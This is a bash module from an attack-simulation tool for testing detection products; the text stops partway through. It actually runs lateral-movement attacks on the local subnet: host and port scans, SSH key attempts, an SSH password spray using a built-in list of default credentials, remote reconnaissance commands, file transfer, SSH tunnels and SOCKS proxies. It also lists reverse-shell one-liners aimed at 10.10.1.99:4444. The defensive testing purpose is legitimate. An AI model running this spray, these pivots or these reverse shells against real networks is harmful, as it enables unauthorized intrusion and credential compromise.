#!/bin/bash
# DLC-04: LATERAL MOVEMENT — Network Pivoting & Remote Execution Simulation
# Part of XDR Creeper | Author: Daniel Budyn | Greeneris
# MITRE: TA0008 Lateral Movement / TA0011 Command & Control | Color: Coral
# Usage: sudo ./newlife-core-linux.sh --dlc 04-lateral-movement

DLC_NAME="DLC-04: LATERAL MOVEMENT"
DLC_DESC="Network pivoting, remote execution, SSH tunneling, host-to-host propagation"
DLC_MITRE="T1021 T1210 T1570 T1080 T1563 T1072 T1571 T1572 T1090 T1018"
DLC_RISK="HIGH"
DLC_ACCENT="${DLC_COLORS[04]:-\033[38;5;208m}"
DLC_TOTAL=15
LM_DARK='\033[38;5;130m'; LM_BASE='\033[38;5;208m'; LM_LIGHT='\033[38;5;216m'; LM_BRIGHT='\033[38;5;223m'; BG_LM='\033[48;5;130m'

DLC_ATTACKS="Live host discovery (ARP + ICMP + TCP multi-method)
Port fingerprinting on discovered hosts
SSH reachability map (subnet-wide port 22 scan)
SSH key-based access attempt (BatchMode)
SSH password spray (common credentials)
Remote command execution via SSH
Remote file transfer via SCP/SFTP
SSH local port forward (tunnel simulation)
SSH dynamic SOCKS proxy setup
Reverse shell pattern generation (syslog trigger)
Internal web service discovery (HTTP probe)
SMB/CIFS enumeration and null session test
RDP/VNC reachability probe
Network route and gateway pivot analysis
Lateral movement summary and attack graph"

lm_phase() { local n=$1; shift; local t="$1"; shift; local m="$1"
  echo ""; echo -e "${BG_LM}${W}                                                                              ${N}"
  echo -e "${BG_LM}${W}  ◆ LATERAL ${n}/${DLC_TOTAL} : ${t}  ${N}"
  echo -e "${BG_LM}${W}  ◆ MITRE       : ${m}  ${N}"
  echo -e "${BG_LM}${W}                                                                              ${N}"; echo ""; sleep 1; }
lm_box_start() { echo -e "  ${LM_BASE}  ┌── ${1} ───────────────────────────────────────────┐${N}"; }
lm_box_line()  { echo -e "  ${LM_BASE}  │${N} $1"; }
lm_box_end()   { echo -e "  ${LM_BASE}  └──────────────────────────────────────────────────────────────┘${N}"; }
lm_alert()     { echo -e "  ${LM_BRIGHT}  🌐 LATERAL → $1${N}"; sleep 0.3; }

lm_explain() {
    local title="$1"; shift
    echo ""; echo -e "  ${LM_LIGHT}  ╭── 📖 ${title} ────────────────────────────────────────╮${N}"
    while [[ $# -gt 0 ]]; do echo -e "  ${LM_LIGHT}  │${N} ${D}$1${N}"; shift; done
    echo -e "  ${LM_LIGHT}  ╰──────────────────────────────────────────────────────────────╯${N}"; echo ""
}

# Discovered targets — shared across attacks
declare -a LIVE_HOSTS=()
declare -a SSH_HOSTS=()
MY_IP=""

get_my_ip() { MY_IP=$(hostname -I 2>/dev/null | awk '{print $1}'); }
get_base()  { echo "$MY_IP" | sed 's/\.[0-9]*$//'; }

# ═══════════════════════════════════════════════════════════════════════════════
# LM 01: LIVE HOST DISCOVERY (Multi-Method)
# ═══════════════════════════════════════════════════════════════════════════════
lm_attack_01() {
    lm_phase 1 "LIVE HOST DISCOVERY — Multi-Method Sweep" "T1018 Remote System Discovery"
    xdr "Subnet sweep — ARP, ICMP, TCP probe combined"

    lm_explain "Host Discovery — Mapping the Network" \
        "Three methods combined: ARP (layer 2), ICMP ping," \
        "TCP connect (ports 22,80,443,3389)." \
        "Results feed into ALL subsequent attacks."
    lm_alert "Network reconnaissance — host discovery"

    get_my_ip
    local base; base=$(get_base)

    lm_box_start "HOST DISCOVERY — ${SUBNET}"
    lm_box_line "${W}Source IP: ${MY_IP}${N}"
    lm_box_line ""

    # Method 1: ARP scan
    lm_box_line "${LM_LIGHT}Method 1: ARP Scan${N}"
    if command -v arp-scan &>/dev/null; then
        while IFS= read -r line; do
            local ip; ip=$(echo "$line" | awk '{print $1}')
            local mac; mac=$(echo "$line" | awk '{print $2}')
            [[ -z "$ip" || "$ip" == "$MY_IP" ]] && continue
            lm_box_line "  ${G}ALIVE${N}  ${ip}  ${D}(${mac})${N}"
            LIVE_HOSTS+=("$ip")
        done < <(arp-scan --localnet 2>/dev/null | grep -E '^[0-9]+\.')
    else
        lm_box_line "  ${D}arp-scan not available${N}"
    fi

    # Method 2: ICMP ping sweep
    lm_box_line ""
    lm_box_line "${LM_LIGHT}Method 2: ICMP Ping Sweep${N}"
    for octet in $(seq 1 20); do
        local target="${base}.${octet}"
        [[ "$target" == "$MY_IP" ]] && continue
        if ping -c 1 -W 1 "$target" &>/dev/null; then
            lm_box_line "  ${G}ALIVE${N}  ${target}  ${D}(ICMP reply)${N}"
            # Add if not already in list
            local found=0; for h in "${LIVE_HOSTS[@]}"; do [[ "$h" == "$target" ]] && found=1; done
            [[ $found -eq 0 ]] && LIVE_HOSTS+=("$target")
        fi
    done

    # Method 3: TCP connect probe (ports 22, 80, 443, 3389)
    lm_box_line ""
    lm_box_line "${LM_LIGHT}Method 3: TCP Connect Probe (22,80,443,3389)${N}"
    for octet in $(seq 1 20); do
        local target="${base}.${octet}"
        [[ "$target" == "$MY_IP" ]] && continue
        for port in 22 80 443 3389; do
            if timeout 1 bash -c "echo >/dev/tcp/${target}/${port}" 2>/dev/null; then
                lm_box_line "  ${G}ALIVE${N}  ${target}:${port}  ${D}(TCP open)${N}"
                local found=0; for h in "${LIVE_HOSTS[@]}"; do [[ "$h" == "$target" ]] && found=1; done
                [[ $found -eq 0 ]] && LIVE_HOSTS+=("$target")
            fi
        done
    done

    lm_box_line ""

    # Deduplicate
    local -a unique=()
    for h in "${LIVE_HOSTS[@]}"; do
        local dup=0; for u in "${unique[@]:-}"; do [[ "$u" == "$h" ]] && dup=1; done
        [[ $dup -eq 0 ]] && unique+=("$h")
    done
    LIVE_HOSTS=("${unique[@]:-}")

    lm_box_line "${W}Total unique live hosts: ${#LIVE_HOSTS[@]}${N}"
    lm_box_end

    result "Discovered ${#LIVE_HOSTS[@]} live hosts in ${SUBNET}"
    csv_log "LM_DISCO" "host_sweep" "${#LIVE_HOSTS[@]} hosts" "OK"

    show_finding "MEDIUM" "Subnet sweep completed"
    write_finding "LM-01" "Host Discovery" "T1018" "EXECUTED" "MEDIUM" \
        "Subnet sweep completed" \
        "Monitor for ARP/ICMP sweeps. Network segmentation."
}

# ═══════════════════════════════════════════════════════════════════════════════
# LM 02: PORT FINGERPRINTING
# ═══════════════════════════════════════════════════════════════════════════════
lm_attack_02() {
    lm_phase 2 "PORT FINGERPRINTING ON DISCOVERED HOSTS" "T1046 Network Service Scanning"
    xdr "Service scan on live hosts — port/version detection"

    lm_explain "Port Fingerprinting" \
        "18 ports probed per host: SSH, HTTP, MySQL, RDP, SMB..." \
        "Open ports reveal services = attack vectors."
    lm_alert "Port fingerprinting in progress"

    if [[ ${#LIVE_HOSTS[@]} -eq 0 ]]; then
        info "No live hosts discovered — skipping fingerprint"
        csv_log "LM_PORTS" "fingerprint" "no targets" "SKIP"
        return
    fi

    local -a top_ports=(22 80 443 8080 8443 3306 5432 6379 27017 3389 5900 2049 111 445 139 8000 9090 9200)

    for target in "${LIVE_HOSTS[@]:0:5}"; do
        lm_box_start "PORTS — ${target}"
        local open_count=0
        for port in "${top_ports[@]}"; do
            if timeout 2 bash -c "echo >/dev/tcp/${target}/${port}" 2>/dev/null; then
                local svc="unknown"
                case $port in
                    22) svc="SSH" ;; 80) svc="HTTP" ;; 443) svc="HTTPS" ;; 8080) svc="HTTP-ALT" ;;
                    3306) svc="MySQL" ;; 5432) svc="PostgreSQL" ;; 6379) svc="Redis" ;;
                    27017) svc="MongoDB" ;; 3389) svc="RDP" ;; 5900) svc="VNC" ;;
                    445) svc="SMB" ;; 139) svc="NetBIOS" ;; 2049) svc="NFS" ;;
                    9200) svc="Elasticsearch" ;; 9090) svc="Prometheus" ;;
                esac
                lm_box_line "  ${G}OPEN${N}  ${port}/tcp  ${LM_LIGHT}${svc}${N}"
                open_count=$((open_count + 1))
                [[ $port -eq 22 ]] && SSH_HOSTS+=("$target")
            fi
        done
        [[ $open_count -eq 0 ]] && lm_box_line "  ${D}No open ports in top set${N}"
        lm_box_end
        csv_log "LM_PORTS" "scan" "$target: $open_count open" "OK"

    show_finding "MEDIUM" "Port scan completed"
    write_finding "LM-02" "Port Fingerprint" "T1046" "EXECUTED" "MEDIUM" \
        "Port scan completed" \
        "Block unnecessary ports. Use host-based firewalls."
    done

    # Deduplicate SSH hosts
    local -a ssh_unique=()
    for h in "${SSH_HOSTS[@]}"; do
        local dup=0; for u in "${ssh_unique[@]:-}"; do [[ "$u" == "$h" ]] && dup=1; done
        [[ $dup -eq 0 ]] && ssh_unique+=("$h")
    done
    SSH_HOSTS=("${ssh_unique[@]:-}")

    result "SSH-enabled hosts: ${#SSH_HOSTS[@]}"
}

# ═══════════════════════════════════════════════════════════════════════════════
# LM 03: SSH REACHABILITY MAP
# ═══════════════════════════════════════════════════════════════════════════════
lm_attack_03() {
    lm_phase 3 "SSH REACHABILITY MAP" "T1021.004 Remote Services: SSH"
    xdr "SSH port 22 scan across full subnet"

    lm_explain "SSH Reachability Map" \
        "Full subnet scan for port 22." \
        "Every SSH host = potential lateral target."
    lm_alert "SSH reachability mapping"

    hack "Scanning ${SUBNET} for SSH (port 22)..."
    echo ""

    # Use nmap if available for speed, otherwise fallback to bash
    if command -v nmap &>/dev/null; then
        lm_box_start "SSH MAP (nmap)"
        nmap -p22 --open -sS "$SUBNET" 2>/dev/null | grep -E 'Nmap scan|22/tcp' | while read l; do
            lm_box_line "${LM_LIGHT}${l}${N}"
        done
        lm_box_end
    else
        lm_box_start "SSH MAP (tcp probe)"
        local base; base=$(get_base)
        for octet in $(seq 1 254); do
            local target="${base}.${octet}"
            [[ "$target" == "$MY_IP" ]] && continue
            if timeout 1 bash -c "echo >/dev/tcp/${target}/22" 2>/dev/null; then
                lm_box_line "  ${G}SSH OPEN${N}  ${target}:22"
                local found=0; for h in "${SSH_HOSTS[@]}"; do [[ "$h" == "$target" ]] && found=1; done
                [[ $found -eq 0 ]] && SSH_HOSTS+=("$target")
            fi
        done
        lm_box_end
    fi

    echo ""
    echo -e "  ${W}  SSH TARGETS AVAILABLE:${N}"
    if [[ ${#SSH_HOSTS[@]} -gt 0 ]]; then
        for h in "${SSH_HOSTS[@]}"; do echo -e "  ${R}  ⚠ ${h}:22${N}"; done
    else
        info "No SSH targets found — lateral movement via SSH will be limited"
        info "Deploy additional VMs in the subnet to enable full testing"
    fi
    csv_log "LM_SSH" "reachability" "${#SSH_HOSTS[@]} hosts" "OK"

    show_finding "MEDIUM" "SSH hosts mapped"
    write_finding "LM-03" "SSH Map" "T1021.004" "EXECUTED" "MEDIUM" \
        "SSH hosts mapped" \
        "Restrict SSH access by source IP. Use jump hosts."
}

# ═══════════════════════════════════════════════════════════════════════════════
# LM 04: SSH KEY-BASED ACCESS ATTEMPT
# ═══════════════════════════════════════════════════════════════════════════════
lm_attack_04() {
    lm_phase 4 "SSH KEY-BASED ACCESS ATTEMPT" "T1021.004 SSH / T1078 Valid Accounts"
    xdr "SSH key authentication attempt to discovered hosts"

    lm_explain "SSH Key-Based Access" \
        "Automated SSH key auth to discovered hosts." \
        "If keys match = immediate lateral movement."
    lm_alert "Automated SSH key-based lateral attempt"

    if [[ ${#SSH_HOSTS[@]} -eq 0 ]]; then
        info "No SSH targets — skipping"
        csv_log "LM_SSH" "key_auth" "no targets" "SKIP"
        return
    fi

    for target in "${SSH_HOSTS[@]:0:5}"; do
        hack "Key-based SSH to ${target}..."
        lm_box_start "SSH KEY AUTH — ${target}"

        if ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 -o BatchMode=yes \
            "${SSH_USER}@${target}" "hostname && id && uname -r" 2>/dev/null; then
            lm_box_line "${R}⚠ ACCESS GRANTED — key auth succeeded!${N}"
            csv_log "LM_SSH" "key_auth" "$target" "SUCCESS"

            hack "Remote enumeration on ${target}..."
            ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 -o BatchMode=yes \
                "${SSH_USER}@${target}" "echo '=HOST='; hostname; echo '=ID='; id; echo '=NET='; ip -4 addr show 2>/dev/null | grep inet; echo '=PORTS='; ss -tulnp 2>/dev/null | grep LISTEN | head -5" \
                2>/dev/null | while read line; do
                    lm_box_line "  ${M}[REMOTE] ${line}${N}"
                done
            csv_log "LM_SSH" "remote_enum" "$target" "OK"
        else
            lm_box_line "${D}Key auth failed (no matching key or access denied)${N}"
            csv_log "LM_SSH" "key_auth" "$target" "BLOCKED"

    show_finding "HIGH" "SSH key auth tested"
    write_finding "LM-04" "SSH Key Auth" "T1021.004" "EXECUTED" "HIGH" \
        "SSH key auth tested" \
        "Don't share SSH keys across hosts. Use certificates."
        fi
        lm_box_end
    done
}

# ═══════════════════════════════════════════════════════════════════════════════
# LM 05: SSH PASSWORD SPRAY
# ═══════════════════════════════════════════════════════════════════════════════
lm_attack_05() {
    lm_phase 5 "SSH PASSWORD SPRAY — Common Credentials" "T1110.001 Brute Force: Password Guessing"
    xdr "SSH password spray — multiple users and passwords"

    lm_explain "SSH Password Spray" \
        "9 usernames x 10 passwords across SSH hosts." \
        "Common cloud defaults: azureuser, ubuntu, ec2-user."
    lm_alert "SSH brute force across subnet"

    local -a users=("$SSH_USER" "root" "admin" "ubuntu" "centos" "azureuser" "ec2-user" "deploy" "vagrant")
    local -a passwords=("admin" "password" "P@ssw0rd" "root123" "Welcome1" "123456" "changeme" "letmein" "toor" "admin123")

    if [[ ${#SSH_HOSTS[@]} -eq 0 ]]; then
        # Spray local subnet IPs even without confirmed SSH
        local base; base=$(get_base)
        local -a spray_targets=()
        for octet in 4 5 6 7 8; do
            local t="${base}.${octet}"
            [[ "$t" != "$MY_IP" ]] && spray_targets+=("$t")
        done
    else
        local -a spray_targets=("${SSH_HOSTS[@]:0:3}")
    fi

    if ! command -v sshpass &>/dev/null; then
        warn "sshpass not installed — generating spray pattern only (no real attempts)"
        echo ""
        for target in "${spray_targets[@]}"; do
            echo -e "  ${W}  Target: ${target}${N}"
            for u in "${users[@]:0:3}"; do
                for pw in "${passwords[@]:0:3}"; do
                    printf "  ${R}  ✘${N} %s → user=%-12s pass=%-14s ${D}SIMULATED${N}\n" "$target" "$u" "$pw"
                    csv_log "LM_SPRAY" "ssh_spray" "$target $u:$pw" "SIMULATED"
                done
            done
            echo ""
        done
        return
    fi

    for target in "${spray_targets[@]}"; do
        echo -e "  ${W}  Target: ${target}${N}"
        local cracked=false
        for u in "${users[@]}"; do
            [[ "$cracked" == "true" ]] && break
            for pw in "${passwords[@]}"; do
                if sshpass -p "$pw" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=3 \
                    "${u}@${target}" "echo ok" 2>/dev/null; then
                    echo -e "  ${R}  ⚠ CRACKED: ${target} → ${u}:${pw}${N}"
                    csv_log "LM_SPRAY" "ssh_cracked" "$target $u:$pw" "CRITICAL"
                    cracked=true
                    break
                else
                    printf "  ${R}  ✘${N} %s → user=%-12s pass=%-14s ${D}DENIED${N}\n" "$target" "$u" "$pw"
                fi
                sleep 0.1
            done
        done
        csv_log "LM_SPRAY" "ssh_spray" "$target" "DONE"

    show_finding "HIGH" "SSH password spray executed"
    write_finding "LM-05" "SSH Spray" "T1110.001" "EXECUTED" "HIGH" \
        "SSH password spray executed" \
        "Enable fail2ban. Use key-only auth. Monitor failed SSH."
        echo ""
    done
}

# ═══════════════════════════════════════════════════════════════════════════════
# LM 06: REMOTE COMMAND EXECUTION VIA SSH
# ═══════════════════════════════════════════════════════════════════════════════
lm_attack_06() {
    lm_phase 6 "REMOTE COMMAND EXECUTION VIA SSH" "T1021.004 / T1059 Command & Scripting"
    xdr "Remote code execution on lateral hosts"

    lm_explain "Remote Command Execution" \
        "Commands run on remote hosts via SSH." \
        "Recon: hostname, id, network, ports, SUID, users."
    lm_alert "SSH remote command execution"

    if [[ ${#SSH_HOSTS[@]} -eq 0 ]]; then
        info "No SSH targets — demonstrating local simulation"
        hack "Simulating remote execution commands..."
        echo ""
        echo -e "  ${W}  COMMANDS THAT WOULD EXECUTE ON TARGETS:${N}"
        local -a remote_cmds=(
            "hostname && id && whoami"
            "cat /etc/passwd | grep -E '/bin/(bash|sh)'"
            "ss -tulnp | grep LISTEN"
            "find / -perm -4000 -type f 2>/dev/null | head -5"
            "cat /etc/os-release | grep PRETTY"
            "df -h / && free -m"
            "last -5"
        )
        for cmd in "${remote_cmds[@]}"; do
            echo -e "  ${LM_BASE}    ssh target \"${cmd}\"${N}"
        done
        csv_log "LM_EXEC" "remote_cmd" "simulated (no targets)" "SIMULATED"
        return
    fi

    for target in "${SSH_HOSTS[@]:0:3}"; do
        lm_box_start "REMOTE EXEC — ${target}"
        if ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 -o BatchMode=yes \
            "${SSH_USER}@${target}" "true" 2>/dev/null; then

            hack "Executing recon commands on ${target}..."
            ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 -o BatchMode=yes \
                "${SSH_USER}@${target}" bash << 'RCMD' 2>/dev/null | while read l; do lm_box_line "  ${D}${l}${N}"; done
echo "=== HOSTNAME ==="; hostname
echo "=== ID ==="; id
echo "=== OS ==="; cat /etc/os-release 2>/dev/null | grep PRETTY
echo "=== NETWORK ==="; ip -4 addr show 2>/dev/null | grep inet | head -5
echo "=== LISTENERS ==="; ss -tulnp 2>/dev/null | grep LISTEN | head -5
echo "=== SUID ==="; find / -perm -4000 -type f 2>/dev/null | head -3
echo "=== USERS ==="; cat /etc/passwd | grep -E '/bin/(bash|sh)' | head -5
RCMD
            csv_log "LM_EXEC" "remote_cmd" "$target: recon executed" "OK"
        else
            lm_box_line "${D}Access denied (no key auth)${N}"
            csv_log "LM_EXEC" "remote_cmd" "$target: denied" "BLOCKED"

    show_finding "HIGH" "Remote execution tested"
    write_finding "LM-06" "Remote Exec" "T1021.004" "EXECUTED" "HIGH" \
        "Remote execution tested" \
        "Monitor remote SSH command execution in audit logs."
        fi
        lm_box_end
    done
}

# ═══════════════════════════════════════════════════════════════════════════════
# LM 07: FILE TRANSFER VIA SCP
# ═══════════════════════════════════════════════════════════════════════════════
lm_attack_07() {
    lm_phase 7 "REMOTE FILE TRANSFER — SCP/SFTP" "T1570 Lateral Tool Transfer"
    xdr "File transfer between hosts — tool propagation"

    lm_explain "File Transfer via SCP" \
        "Tool transfer between hosts = propagation." \
        "Attacker spreads tools, scripts, malware."
    lm_alert "Lateral tool transfer via SCP"

    # Create a harmless test payload
    echo "# XDR Creeper — lateral transfer test — $(date)" > /tmp/.xdr_lateral_payload 2>/dev/null

    if [[ ${#SSH_HOSTS[@]} -eq 0 ]]; then
        info "No SSH targets — showing transfer simulation"
        echo -e "  ${W}  TRANSFER COMMANDS:${N}"
        echo -e "  ${LM_BASE}    scp /tmp/.xdr_lateral_payload target:/tmp/${N}"
        echo -e "  ${LM_BASE}    rsync -avz payload target:/tmp/${N}"
        echo -e "  ${LM_BASE}    sftp target <<< 'put payload /tmp/'${N}"
        echo -e "  ${LM_BASE}    cat payload | ssh target 'cat > /tmp/payload'${N}"
        csv_log "LM_TRANSFER" "scp" "simulated" "SIMULATED"
    else
        for target in "${SSH_HOSTS[@]:0:3}"; do
            hack "Transferring payload to ${target}..."
            if scp -o StrictHostKeyChecking=no -o ConnectTimeout=5 \
                /tmp/.xdr_lateral_payload "${SSH_USER}@${target}:/tmp/.xdr_lateral_payload" 2>/dev/null; then
                result "File transferred to ${target}:/tmp/"
                csv_log "LM_TRANSFER" "scp" "$target: success" "OK"

                # Clean up remote file
                ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 -o BatchMode=yes \
                    "${SSH_USER}@${target}" "rm -f /tmp/.xdr_lateral_payload" 2>/dev/null
                ok "Remote file cleaned up"
            else
                info "SCP to ${target} failed (no access)"
                csv_log "LM_TRANSFER" "scp" "$target: failed" "BLOCKED"
            fi
        done
    fi

    rm -f /tmp/.xdr_lateral_payload
    ok "Local payload removed"
    csv_log "LM_TRANSFER" "cleanup" "done" "OK"

    show_finding "MEDIUM" "File transfer tested"
    write_finding "LM-07" "SCP Transfer" "T1570" "EXECUTED" "MEDIUM" \
        "File transfer tested" \
        "Monitor SCP/SFTP transfers. Whitelist allowed transfers."
}

# ═══════════════════════════════════════════════════════════════════════════════
# LM 08: SSH LOCAL PORT FORWARD (Tunnel)
# ═══════════════════════════════════════════════════════════════════════════════
lm_attack_08() {
    lm_phase 8 "SSH LOCAL PORT FORWARD — Tunnel Simulation" "T1572 Protocol Tunneling / T1090 Proxy"
    xdr "SSH tunnel established — port forwarding"

    lm_explain "SSH Tunnel / Port Forward" \
        "SSH -L (local forward), -R (remote), -D (SOCKS)." \
        "Tunnels bypass firewall rules by routing through SSH."
    lm_alert "SSH tunnel / port forward detected"

    hack "Simulating SSH tunnel commands..."
    echo ""
    lm_box_start "SSH TUNNEL TECHNIQUES"
    lm_box_line "${W}Local port forward (access remote service through tunnel):${N}"
    lm_box_line "  ${LM_BASE}ssh -L 8080:internal-db:3306 pivot-host${N}"
    lm_box_line "  ${D}→ localhost:8080 tunnels to internal-db:3306 via pivot-host${N}"
    lm_box_line ""
    lm_box_line "${W}Remote port forward (expose local service to remote):${N}"
    lm_box_line "  ${LM_BASE}ssh -R 9090:localhost:8080 pivot-host${N}"
    lm_box_line "  ${D}→ pivot-host:9090 tunnels back to our localhost:8080${N}"
    lm_box_line ""
    lm_box_line "${W}Dynamic SOCKS proxy (full subnet access):${N}"
    lm_box_line "  ${LM_BASE}ssh -D 1080 pivot-host${N}"
    lm_box_line "  ${D}→ localhost:1080 becomes SOCKS5 proxy through pivot-host${N}"
    lm_box_line ""
    lm_box_line "${W}Multi-hop pivot chain:${N}"
    lm_box_line "  ${LM_BASE}ssh -J jump1,jump2 final-target${N}"
    lm_box_line "  ${D}→ chain through multiple hosts to reach final target${N}"
    lm_box_end

    # Actually attempt a brief tunnel if targets exist
    if [[ ${#SSH_HOSTS[@]} -gt 0 ]]; then
        local target="${SSH_HOSTS[0]}"
        hack "Attempting brief SSH tunnel to ${target}..."
        ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 -o BatchMode=yes \
            -L 19999:localhost:22 -f -N "${SSH_USER}@${target}" 2>/dev/null
        local tunnel_pid=$!

        if ss -tlnp 2>/dev/null | grep -q ":19999"; then
            result "SSH tunnel ACTIVE: localhost:19999 → ${target}:22"
            csv_log "LM_TUNNEL" "local_fwd" "$target: port 19999" "OK"
            sleep 2
            kill $tunnel_pid 2>/dev/null; wait $tunnel_pid 2>/dev/null
            ok "Tunnel closed"
        else
            info "Tunnel creation failed (access denied)"
            csv_log "LM_TUNNEL" "local_fwd" "$target: failed" "BLOCKED"
        fi
    else
        logger -t "xdr-creeper" "LATERAL: SSH tunnel simulation (no live targets)"
        csv_log "LM_TUNNEL" "local_fwd" "simulated" "SIMULATED"

    show_finding "HIGH" "SSH tunnel capability tested"
    write_finding "LM-08" "SSH Tunnel" "T1572" "EXECUTED" "HIGH" \
        "SSH tunnel capability tested" \
        "Monitor SSH tunnel connections. Restrict SSH port forwarding."
    fi
}

# ═══════════════════════════════════════════════════════════════════════════════
# LM 09: SSH DYNAMIC SOCKS PROXY
# ═══════════════════════════════════════════════════════════════════════════════
lm_attack_09() {
    lm_phase 9 "SSH DYNAMIC SOCKS PROXY SETUP" "T1090.001 Proxy: Internal Proxy / T1572 Protocol Tunneling"
    xdr "SOCKS proxy via SSH — subnet pivoting capability"

    lm_explain "SOCKS Proxy Setup" \
        "Dynamic SOCKS proxy pivots entire subnet through one host." \
        "proxychains + SSH -D = scan internal networks remotely."
    lm_alert "Dynamic proxy creation attempt"

    run "Checking for existing SOCKS proxies..."
    echo ""
    local existing_proxies
    existing_proxies=$(ss -tlnp 2>/dev/null | grep -E ':(1080|9050|8080|3128)' || echo "")
    if [[ -n "$existing_proxies" ]]; then
        echo -e "  ${R}  ⚠ EXISTING PROXY PORTS:${N}"
        echo "$existing_proxies" | while read l; do echo -e "  ${D}    ${l}${N}"; done
    else
        echo -e "  ${G}  ✔ No existing proxy listeners${N}"
    fi

    echo ""
    hack "Checking for proxy tools..."
    for tool in socat ncat proxychains4 proxychains chisel; do
        if command -v "$tool" &>/dev/null; then
            echo -e "  ${Y}  ⚠ FOUND: ${tool}${N}"
        fi
    done
    csv_log "LM_PROXY" "tools" "checked" "OK"

    echo ""
    echo -e "  ${W}  PIVOT SCENARIO:${N}"
    echo -e "  ${LM_BASE}    1. ssh -D 1080 pivot-host                    → SOCKS proxy${N}"
    echo -e "  ${LM_BASE}    2. proxychains nmap -sT internal-subnet      → scan through proxy${N}"
    echo -e "  ${LM_BASE}    3. proxychains curl http://internal-service   → access internal services${N}"
    echo ""

    if [[ ${#SSH_HOSTS[@]} -gt 0 ]]; then
        local target="${SSH_HOSTS[0]}"
        hack "Brief SOCKS proxy attempt via ${target}..."
        ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 -o BatchMode=yes \
            -D 19998 -f -N "${SSH_USER}@${target}" 2>/dev/null
        if ss -tlnp 2>/dev/null | grep -q ":19998"; then
            result "SOCKS proxy ACTIVE on localhost:19998 via ${target}"
            csv_log "LM_PROXY" "socks" "$target: port 19998" "OK"
            sleep 2
            pkill -f "ssh.*-D 19998" 2>/dev/null
            ok "SOCKS proxy closed"
        else
            info "SOCKS proxy failed"
            csv_log "LM_PROXY" "socks" "$target: failed" "BLOCKED"
        fi
    else
        csv_log "LM_PROXY" "socks" "simulated" "SIMULATED"

    show_finding "HIGH" "SOCKS proxy capability tested"
    write_finding "LM-09" "SOCKS Proxy" "T1090.001" "EXECUTED" "HIGH" \
        "SOCKS proxy capability tested" \
        "Block unauthorized SOCKS ports. Monitor for proxychains."
    fi
}

# ═══════════════════════════════════════════════════════════════════════════════
# LM 10: REVERSE SHELL PATTERN GENERATION
# ═══════════════════════════════════════════════════════════════════════════════
lm_attack_10() {
    lm_phase 10 "REVERSE SHELL PATTERN GENERATION" "T1059 Command & Scripting / T1571 Non-Standard Port"
    xdr "Reverse shell signatures in processes and syslog"

    lm_explain "Reverse Shell Patterns" \
        "8 reverse shell signatures written to syslog." \
        "Tests pattern matching: bash, python, nc, perl, ruby."
    lm_alert "Reverse shell pattern detection trigger"

    warn "These are PATTERNS ONLY — no actual connections established"
    echo ""

    lm_box_start "REVERSE SHELL SIGNATURES"
    local -a patterns=(
        "bash -i >& /dev/tcp/10.10.1.99/4444 0>&1"
        "python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"10.10.1.99\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/bash\")'"
        "nc -e /bin/bash 10.10.1.99 4444"
        "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.1.99 4444 >/tmp/f"
        "perl -e 'use Socket;socket(S,PF_INET,SOCK_STREAM,0);connect(S,pack_sockaddr_in(4444,inet_aton(\"10.10.1.99\")));open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh\")'"
        "ruby -rsocket -e 'f=TCPSocket.open(\"10.10.1.99\",4444);exec \"/bin/sh -i\",[:in,:out,:err]=>[f,f,f]'"
        "php -r '\$sock=fsockopen(\"10.10.1.99\",4444);exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
        "socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.1.99:4444"
    )
    for p in "${patterns[@]}"; do
        lm_box_line "${R}⚡ ${p}${N}"
        csv_log "LM_REVSHELL" "pattern" "${p:0:60}" "LOGGED"
        sleep 0.2
    done
    lm_box_end

    hack "Writing reverse shell signatures to syslog..."
    logger -t "xdr-creeper" "LATERAL: bash -i >& /dev/tcp/10.10.1.99/4444 0>&1"
    logger -t "xdr-creeper" "LATERAL: nc -e /bin/bash reverse shell attempt"
    logger -t "xdr-creeper" "LATERAL: mkfifo /tmp/f pipe-based shell redirect"
    result "Reverse shell patterns written to syslog"

    # Create and remove named pipe trigger
    hack "Creating named pipe (reverse shell infrastructure)..."
    mkfifo /tmp/.xdr_revshell_fifo 2>/dev/null || true
    result "Named pipe: /tmp/.xdr_revshell_fifo"
    csv_log "LM_REVSHELL" "mkfifo" "/tmp/.xdr_revshell_fifo" "OK"

    show_finding "HIGH" "Reverse shell patterns logged"
    write_finding "LM-10" "Reverse Shells" "T1059" "EXECUTED" "HIGH" \
        "Reverse shell patterns logged" \
        "Alert on /dev/tcp, mkfifo, nc -e patterns in process args."
    sleep 2
    rm -f /tmp/.xdr_revshell_fifo
    ok "Named pipe removed"
}

# ═══════════════════════════════════════════════════════════════════════════════
# LM 11: INTERNAL WEB SERVICE DISCOVERY
# ═══════════════════════════════════════════════════════════════════════════════
lm_attack_11() {
    lm_phase 11 "INTERNAL WEB SERVICE DISCOVERY" "T1046 / T1071 Application Layer Protocol"
    xdr "HTTP probe on discovered hosts — internal service mapping"

    lm_explain "Internal Web Discovery" \
        "HTTP probe on 10 ports per host." \
        "Finds Jenkins, Grafana, Elasticsearch — internal services."
    lm_alert "Web service enumeration"

    local -a web_ports=(80 443 8080 8443 8000 8888 9090 9200 3000 5000)

    if [[ ${#LIVE_HOSTS[@]} -eq 0 ]]; then
        info "No live hosts — probing common local ports only"
        local -a probe_targets=("127.0.0.1")
    else
        local -a probe_targets=("${LIVE_HOSTS[@]:0:5}")
    fi

    hack "Probing HTTP services..."
    echo ""
    for target in "${probe_targets[@]}"; do
        for port in "${web_ports[@]}"; do
            local proto="http"
            [[ $port -eq 443 || $port -eq 8443 ]] && proto="https"

            local code
            code=$(curl -s -o /dev/null -w "%{http_code}" --max-time 3 -k "${proto}://${target}:${port}/" 2>/dev/null || echo "000")
            if [[ "$code" != "000" ]]; then
                local title
